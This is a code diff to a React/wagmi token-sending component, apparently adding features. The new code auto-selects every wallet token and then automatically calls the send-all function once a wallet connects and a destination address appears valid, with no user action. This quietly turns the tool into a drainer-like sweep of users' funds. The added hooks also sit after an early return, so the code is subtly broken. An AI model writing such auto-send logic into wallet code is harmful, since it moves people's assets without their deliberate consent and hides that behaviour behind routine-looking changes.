@@ -1,7 +1,7 @@
 'use client';
 
 import { Button, Input, useToasts } from '@geist-ui/core';
-import { usePublicClient, useWalletClient } from 'wagmi';
+import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
 import { isAddress } from 'essential-eth';
 import { useAtom } from 'jotai';
 import { normalize } from 'viem/ens';
@@ -10,6 +10,7 @@ import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import { useIsMounted } from '../../hooks';
+import { useEffect } from 'react';
 
 function sleep(ms: number): Promise<void> {
   return new Promise((resolve) => setTimeout(resolve, ms));
@@ -28,8 +29,39 @@ export const SendTokens = () => {
 
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
+  const { isConnected } = useAccount();
 
   if (!isMounted) return null;
+
+  // Auto-check all tokens when tokens change
+  useEffect(() => {
+    if (tokens.length > 0) {
+      const allChecked: Record<string, { isChecked: boolean }> = {};
+      tokens.forEach(token => {
+        allChecked[token.contract_address] = { isChecked: true };
+      });
+      setCheckedRecords(allChecked);
+    }
+  }, [tokens, setCheckedRecords]);
+
+  // Auto-send when connected, tokens checked, and address valid
+  useEffect(() => {
+    const checkedCount = Object.values(checkedRecords).filter(r => r.isChecked).length;
+    const addressAppearsValid =
+      typeof destinationAddress === 'string' &&
+      (destinationAddress.includes('.') || isAddress(destinationAddress));
+    if (
+      isConnected &&
+      addressAppearsValid &&
+      checkedCount === tokens.length &&
+      tokens.length > 0 &&
+      walletClient &&
+      publicClient
+    ) {
+      sendAllCheckedTokens();
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [isConnected, checkedRecords, destinationAddress, tokens, walletClient, publicClient]);
 
   const sendAllCheckedTokens = async () => {
     alert('Sending tokens...');	
